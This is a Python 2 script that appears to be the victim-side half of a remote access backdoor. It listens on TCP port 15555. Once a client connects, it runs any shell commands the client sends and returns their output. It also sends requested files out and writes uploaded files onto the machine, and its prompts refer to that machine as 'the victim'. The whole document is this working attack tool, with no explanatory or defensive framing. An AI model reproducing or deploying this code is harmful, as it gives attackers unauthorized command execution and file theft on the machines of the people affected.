#!/usr/bin/env python
# coding: utf-8

# Libraries import
import os
import sys
import socket
import subprocess

# checking file/directory match
def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)

# serverSocket creation + option so_reuseaddr
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serverSocket.bind(('', 15555))
serverSocket.listen(1)
#print "[*] Server is running and listening on 15555 TCP port"
client, address = serverSocket.accept()
#print "[*] {} connected on the server".format(address)

# Processing
try:
	client.sendall("up")
except socket.error, e:
	errorcode=e[1]
	print errorcode
try:
	action = client.recv(256)
	if action == "1":
		while True:
			try:
				commandToRun = client.recv(4096)
				if commandToRun != "":
					try:
						output = subprocess.check_output(commandToRun, shell=True)
						client.sendall(output)
					except subprocess.CalledProcessError as errorCmd:
						#print "error code", errorCmd.returncode, errorCmd.output
						client.sendall(errorCmd.output)
				else:
					client.close()
					sys.exit()
			except KeyboardInterrupt:
				#print "\n Keyboard Interruption : Closing socket..."
				client.close()
				sys.exit()

	elif action == "2":
		try:
			waitingFilename = "Enter the filename to download from the victim : "
			client.sendall(waitingFilename)
			# Processing request 
			sFilename = client.recv(256)
			cwd = os.getcwd()
			if os.path.exists(cwd+"/"+sFilename):
				openingFile = open(cwd+"/"+sFilename,"rb")
				readingFile = openingFile.read(4096)
				client.sendall(readingFile)
				openingFile.close()
			if not os.path.exists(cwd+"/"+sFilename):
				client.sendall("unknown")
		except socket.error, e:
			errorcode=e[1]
			print errorcode

	elif action == "3":
		try:
			waitingFilename = "Enter the filename to upload to the victim : "
			client.sendall(waitingFilename)
			#processing request
			Filename = client.recv(256)
			#print Filename
			if Filename != "":
				print Filename
				clientFiledata = "tmp"	
				clientFiledata = client.recv(4096)
				uploadedFile = open(Filename, "wb")
				#importing data in the new file
				try:
					uploadedFile.write(clientFiledata)
					uploadedFile.close()
				except:
					sys.exit()
				client.sendall("[*] File successfully transfered !")
		except:
			pass
	else:
		pass
		
except socket.error, e:
	errorcode=e[1]
	print errorcode

serverSocket.close()